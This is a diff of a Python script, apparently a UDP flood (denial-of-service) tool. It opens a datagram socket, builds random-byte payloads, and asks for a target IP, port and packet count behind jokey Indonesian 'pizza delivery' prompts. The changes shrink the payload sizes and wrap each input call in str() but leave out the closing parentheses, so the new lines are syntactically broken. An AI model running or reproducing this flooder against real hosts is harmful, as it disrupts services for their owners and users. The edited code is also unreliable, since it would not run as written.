@@ -6,18 +6,18 @@ import time
 import sys
 
 white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(32000)
-bytes = random._urandom(35523)
-bytes = random._urandom(23443)
-bytes  = random._urandom(25535)
+bytes = random._urandom(666)
+bytes = random._urandom(666)
+bytes = random._urandom(666)
+bytes  = random._urandom(666)
 
 os.system("clear")
 
-ip = input("[+] Pizza IP : ")
-port = input("[+] Pizza Port : ")
-sent = input("[+] Masukan Jumlah Pizza Ke Dalam Box : ")
-random = input("[+] Random Tools : ")
-ping = input("[+] Jumlah Pizza 1-500000 : ")
+ip = str(input("[+] Pizza IP : ")
+port = str(input("[+] Pizza Port : ")
+sent = str(input("[+] Masukan Jumlah Pizza Ke Dalam Box : ")
+random = str(input("[+] Random Tools : ")
+ping = str(input("[+] Jumlah Pizza 1-500000 : ")
 os.system("clear") 
 print("Pergi Ke Toko PizzaHot✓...")
 time.sleep(3)
